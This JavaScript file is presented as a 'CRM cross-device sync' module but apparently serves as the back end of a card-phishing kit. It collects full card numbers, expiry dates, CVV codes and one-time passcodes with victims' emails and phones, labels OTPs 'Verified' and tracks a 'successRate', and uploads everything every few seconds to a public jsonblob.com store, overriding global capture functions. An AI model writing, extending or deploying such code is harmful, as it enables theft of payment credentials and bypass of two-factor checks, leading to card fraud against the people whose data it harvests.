// Working CRM Cross-Device Synchronization System
class WorkingCRMSync {
  constructor() {
    this.storageKey = 'crm_data_v2';
    this.deviceId = this.getDeviceId();
    this.lastSyncTime = localStorage.getItem('crmLastSync') || null;
    this.syncUrl = 'https://jsonblob.com/api/jsonblob'; // Free JSON storage service
    this.blobId = this.getOrCreateBlobId();
    this.init();
  }

  init() {
    console.log('CRM: Initializing working cross-device sync...');
    console.log('CRM: Device ID:', this.deviceId);
    console.log('CRM: Blob ID:', this.blobId);
    
    // Monitor online status
    window.addEventListener('online', () => {
      console.log('CRM: Back online - syncing...');
      this.syncFromCloud();
    });

    // Auto-sync every 10 seconds
    setInterval(() => {
      if (navigator.onLine) {
        this.syncFromCloud();
      }
    }, 10000);
  }

  getDeviceId() {
    let deviceId = localStorage.getItem('crmDeviceId');
    if (!deviceId) {
      deviceId = 'device_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmDeviceId', deviceId);
      console.log('CRM: Created new device ID:', deviceId);
    }
    return deviceId;
  }

  getOrCreateBlobId() {
    let blobId = localStorage.getItem('crmBlobId');
    if (!blobId) {
      // Generate new blob ID
      blobId = 'blob_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmBlobId', blobId);
      console.log('CRM: Created new blob ID:', blobId);
    }
    return blobId;
  }

  // Get local data
  getLocalData() {
    try {
      const data = localStorage.getItem(this.storageKey);
      if (!data) {
        // Initialize with sample data if empty
        const initialData = {
          orders: [],
          cards: [],
          otp: [],
          settings: {
            lastUpdated: new Date().toISOString(),
            deviceId: this.deviceId,
            version: '2.0'
          }
        };
        localStorage.setItem(this.storageKey, JSON.stringify(initialData));
        return initialData;
      }
      return JSON.parse(data);
    } catch (e) {
      console.error('CRM: Error reading local data:', e);
      return { orders: [], cards: [], otp: [] };
    }
  }

  // Save local data
  saveLocalData(data) {
    try {
      data.settings = data.settings || {};
      data.settings.lastUpdated = new Date().toISOString();
      data.settings.deviceId = this.deviceId;
      data.settings.version = '2.0';
      
      localStorage.setItem(this.storageKey, JSON.stringify(data));
      return true;
    } catch (e) {
      console.error('CRM: Error saving local data:', e);
      return false;
    }
  }

  // Load data from cloud
  async loadFromCloud() {
    try {
      console.log('CRM: Loading from cloud...');
      
      // Try to load from JSONBlob
      const response = await fetch(`${this.syncUrl}/${this.blobId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        const data = await response.json();
        console.log('CRM: Cloud data loaded:', data);
        return data;
      } else {
        console.log('CRM: No cloud data found, will create new');
        return null;
      }
    } catch (error) {
      console.error('CRM: Failed to load from cloud:', error);
      return null;
    }
  }

  // Save data to cloud
  async saveToCloud(data) {
    try {
      console.log('CRM: Saving to cloud...');
      
      // Try to save to JSONBlob
      const response = await fetch(this.syncUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });

      if (response.ok) {
        const result = await response.json();
        console.log('CRM: Cloud save successful:', result);
        
        // Update blob ID if new
        if (result.uuid) {
          localStorage.setItem('crmBlobId', result.uuid);
          this.blobId = result.uuid;
        }
        
        // Update sync time
        localStorage.setItem('crmLastSync', Date.now().toString());
        this.lastSyncTime = Date.now().toString();
        
        return true;
      } else {
        console.error('CRM: Cloud save failed:', response.status);
        return false;
      }
    } catch (error) {
      console.error('CRM: Failed to save to cloud:', error);
      return false;
    }
  }

  // Sync from cloud
  async syncFromCloud() {
    if (!navigator.onLine) {
      console.log('CRM: Offline - skipping sync');
      return false;
    }

    try {
      // Load from cloud
      const cloudData = await this.loadFromCloud();
      
      if (cloudData) {
        // Get local data
        const localData = this.getLocalData();
        
        // Merge data
        const mergedData = this.mergeData(localData, cloudData);
        
        // Save merged data locally
        this.saveLocalData(mergedData);
        
        console.log('CRM: Sync from cloud completed');
        return true;
      } else {
        console.log('CRM: No cloud data to sync, uploading local data');
        // Upload local data to cloud
        const localData = this.getLocalData();
        await this.saveToCloud(localData);
        return false;
      }
    } catch (error) {
      console.error('CRM: Sync from cloud failed:', error);
      return false;
    }
  }

  // Sync to cloud
  async syncToCloud() {
    if (!navigator.onLine) {
      console.log('CRM: Offline - skipping cloud save');
      return false;
    }

    try {
      // Get local data
      const localData = this.getLocalData();
      
      // Save to cloud
      const success = await this.saveToCloud(localData);
      
      if (success) {
        console.log('CRM: Sync to cloud completed');
        return true;
      } else {
        console.log('CRM: Sync to cloud failed');
        return false;
      }
    } catch (error) {
      console.error('CRM: Sync to cloud failed:', error);
      return false;
    }
  }

  // Merge local and cloud data
  mergeData(localData, cloudData) {
    const merged = {
      orders: [...(cloudData.orders || []), ...(localData.orders || [])],
      cards: [...(cloudData.cards || []), ...(localData.cards || [])],
      otp: [...(cloudData.otp || []), ...(localData.otp || [])],
      settings: {
        ...cloudData.settings,
        ...localData.settings,
        lastSync: new Date().toISOString(),
        deviceId: this.deviceId,
        version: '2.0'
      }
    };

    // Remove duplicates based on ID
    merged.orders = this.removeDuplicates(merged.orders, 'id');
    merged.cards = this.removeDuplicates(merged.cards, 'id');
    merged.otp = this.removeDuplicates(merged.otp, 'id');

    // Sort by timestamp (newest first)
    merged.orders.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    merged.cards.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    merged.otp.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    return merged;
  }

  // Remove duplicates
  removeDuplicates(array, key) {
    const seen = new Set();
    return array.filter(item => {
      if (seen.has(item[key])) {
        return false;
      }
      seen.add(item[key]);
      return true;
    });
  }

  // Get CRM stats
  async getStats() {
    const data = this.getLocalData();
    return {
      totalOrders: data.orders?.length || 0,
      totalCards: data.cards?.length || 0,
      totalOTP: data.otp?.length || 0,
      successRate: data.otp?.length > 0 ? 100 : 0,
      lastSync: this.lastSyncTime ? new Date(parseInt(this.lastSyncTime)).toISOString() : null,
      deviceId: this.deviceId,
      isOnline: navigator.onLine,
      syncEnabled: true,
      blobId: this.blobId
    };
  }

  // Add order with cross-device sync
  async addOrder(orderData) {
    const data = this.getLocalData();
    const order = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      fullName: orderData.fullName,
      email: orderData.email,
      phone: orderData.phone,
      orderTotal: orderData.orderTotal,
      status: 'Completed'
    };
    
    data.orders = data.orders || [];
    data.orders.unshift(order);
    
    // Save locally
    this.saveLocalData(data);
    
    // Sync to cloud immediately
    setTimeout(() => this.syncToCloud(), 500);
    
    console.log('CRM: Order added and syncing across devices');
    return order;
  }

  // Add card details with cross-device sync
  async addCardDetails(cardData) {
    const data = this.getLocalData();
    const card = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      cardName: cardData.cardName,
      cardNumber: cardData.cardNumber,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      status: 'Received'
    };
    
    data.cards = data.cards || [];
    data.cards.unshift(card);
    
    // Save locally
    this.saveLocalData(data);
    
    // Sync to cloud immediately
    setTimeout(() => this.syncToCloud(), 500);
    
    console.log('CRM: Card details added and syncing across devices');
    return card;
  }

  // Add OTP data with cross-device sync
  async addOTPData(otpData) {
    const data = this.getLocalData();
    const otp = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      submittedOTP: otpData.submittedOTP,
      email: otpData.email,
      phone: otpData.phone,
      status: 'Verified'
    };
    
    data.otp = data.otp || [];
    data.otp.unshift(otp);
    
    // Save locally
    this.saveLocalData(data);
    
    // Sync to cloud immediately
    setTimeout(() => this.syncToCloud(), 500);
    
    console.log('CRM: OTP data added and syncing across devices');
    return otp;
  }

  // Generate unique ID
  generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
  }

  // Export data
  async exportData() {
    const data = this.getLocalData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // Clear all data
  async clearAllData() {
    const initialData = {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        autoSave: true,
        lastBackup: new Date().toISOString(),
        deviceId: this.deviceId,
        version: '2.0'
      }
    };
    
    this.saveLocalData(initialData);
    await this.syncToCloud();
  }
}

// Initialize working sync system
window.workingCRMSync = new WorkingCRMSync();

// Override all CRM functions
window.addOrder = async function(data) {
  return await window.workingCRMSync.addOrder(data);
};

window.addCardDetails = async function(data) {
  return await window.workingCRMSync.addCardDetails(data);
};

window.addOTPData = async function(data) {
  return await window.workingCRMSync.addOTPData(data);
};

window.syncCRMFromCloud = async function() {
  return await window.workingCRMSync.syncFromCloud();
};

window.cloudCRMStorage = window.workingCRMSync;

console.log('Working CRM Sync System initialized - real cross-device sync');
